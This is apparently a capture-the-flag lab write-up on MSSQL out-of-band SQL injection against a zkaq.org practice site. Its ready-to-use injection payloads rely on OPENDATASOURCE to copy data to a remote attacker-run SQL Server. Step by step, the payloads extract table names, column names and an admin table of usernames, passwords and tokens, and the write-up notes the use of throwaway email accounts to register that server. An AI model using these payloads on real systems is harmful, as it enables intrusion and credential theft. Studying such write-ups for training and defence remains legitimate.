# Lab 5.3.1 MSSQL Reflection Injection

## 0x00 Basic Knowledge

MSSQL is much complex and powerful. So sometimes we cannot see error data display on webpages but may still use some internal functions to send data to remote server/database.

### [OPENDATASOURCE(provider_name, init_string)][5]

*provider_name*

Is the name registered as the PROGID of the OLE DB provider used to access the data source. provider_name is a char data type, with no default value.

*init_string*
Is the connection string passed to the IDataInitialize interface of the destination provider. The provider string syntax is based on keyword-value pairs separated by semicolons, such as: 'keyword1=value ; keyword2=value'.

### Injection Query

```sql
INSERT INTO OPENDATASOURCE('sqloledb','server=server.com,1433;uid=uid;pwd=pwd;database=database').database.dbo.table SELECT * FROM admin --
```

### Setup Remote Database

Try with [Aliyun][6], [AWS][7], [Azure][8] or [Webweb][3] with help of [bccto][4] email register.

### Create Corresponding Table

The remote database table need to have exactely same field numbers and types to receive data.

```sql
CREATE TABLE remote(id int, str char(255), str1 char(255))
```

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Get Table Name

Prepare remote table first.

```sql
CREATE TABLE tbl_name(id int, tbl_name char(255))
```

Make request

```sql
?id=2';INSERT INTO OPENDATASOURCE('sqloledb','server=server.com,1433;uid=uid;pwd=pwd;database=database').database.dbo.tbl_name SELECT id,name FROM dbo.sysobjects WHERE xtype='U'--
```

![](./imgs/1_tbl_name.jpg)

| id         | tbl_name  |
| ---------- | --------- |
| 1977058079 | admin     |
| 2009058193 | news      |

### Get Field Number

Prepare another table.

```sql
CREATE TABLE field_name(id int, field_name char(255))
```

Make request

```sql
?id=2';INSERT INTO OPENDATASOURCE('sqloledb','server=server.com,1433;uid=uid;pwd=pwd;database=database').database.dbo.field_name SELECT id,name FROM dbo.syscolumns WHERE id=1977058079 --
```

![](./imgs/2_field_num.jpg)

| id         | field_name |
| ---------- | ---------- |
| 1977058079 | id         |
| 1977058079 | passwd     |
| 1977058079 | token      |
| 1977058079 | username   |

### Dump Data

Create last table for token

```sql
CREATE TABLE flag(id int, username char(255), passwd char(255), token char(255))
```

Make last request

```sql
?id=2';INSERT INTO OPENDATASOURCE('sqloledb','server=server.com,1433;uid=uid;pwd=pwd;database=database').database.dbo.flag SELECT * FROM admin --
```

![](./imgs/3_flag.jpg)

**FLAG** = **zkaq{e9c9e67c5}**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=7dd07600c96f5d55
[2]: http://120.203.13.75:8150/MSSQL/?id=2
[3]: http://www.webweb.com/
[4]: https://bccto.me/
[5]: https://docs.microsoft.com/en-us/sql/t-sql/functions/opendatasource-transact-sql?view=sql-server-2017
[6]: https://cn.aliyun.com/
[7]: https://aws.amazon.com/
[8]: https://azure.microsoft.com/en-us/